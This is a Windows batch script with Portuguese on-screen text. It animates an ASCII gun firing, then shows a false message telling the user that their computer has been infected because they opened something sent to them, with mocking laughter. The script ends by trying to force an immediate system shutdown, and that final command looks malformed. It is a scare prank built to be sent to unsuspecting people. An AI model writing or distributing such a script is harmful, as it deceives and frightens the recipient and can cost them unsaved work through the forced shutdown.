@echo off
title -- COMPUTADOR INFECTADO --
mode con cols=80 lines=13 &color 0F
setlocal enabledelayedexpansion
set VELOC=1
set TIR=5
for /l %%§ in (0,1,4) do set "PROX_%%§=[ÛÛÛÛD"
:LIMPAR
set ESPAÇO=
set "BANG= "
set CONTA=0
set ANDA=
for /l %%§ in (1,1,20) do (
 set /a CONTA+=1
 set "GAT= `\ /"
 if !CONTA!==1 set "GAT= ^| /"
 if !CONTA!==2 set "BANG= "
 if !CONTA!==3 (
 set "BANG= "
 if not !TIR! EQU 0 set "ANDA=[ÛÛÛÛD"
 if not !TIR! EQU 0 set /a TIR-=1
 set "PROX_!TIR!= "
 )
 if !CONTA!==4 set "BANG= "
 if !CONTA! GEQ 4 set "ESPAÇO= !ESPAÇO!"
 if !CONTA!==5 set BANG=
 if not !TIR! EQU 0 (
 if !CONTA!==8 set "BANG= "
 if !CONTA!==9 set "BANG= "
 if !CONTA!==10 set "BANG= "
 if !CONTA!==11 set "BANG= "
 )
 if !CONTA! EQU 20 set ANDA=
CLS
 echo.
 echo. !BANG!,--^----------,--------,-----,-------"--,
echo. !BANG!^| ^|^|^|^|^|^|^|^|^| `--------' ^| O!ESPAÇO!!ANDA!
 echo. !BANG!`+---------------------------^----------^|
 echo `\_,-------, _________________________^|
 echo / !PROX_0! /`/ /"
 echo / !PROX_1! /!GAT!                  SEU COMPUTADOR ACABA DE SER INFECTADO    
 echo / !PROX_2! /\______^(               CUIDADO COM SUAS ATIDUDES DA PRàXIMA
 echo / !PROX_3! /                          VEZ QUE ABRIR ALGO QUE LHE MANDAM
 echo / !PROX_4! /                        SHUASHAUHSUASHAUHSUASHSHASUHSAUSUHASA
 echo ^(________^(
 echo `------'
@ping localhost -n %VELOC% >nul
 )

if !TIR! EQU 0 goto :END
goto :LIMPAR
:END

PING -n 5 127.0.0.1 >nul
shutdown -s  t 0
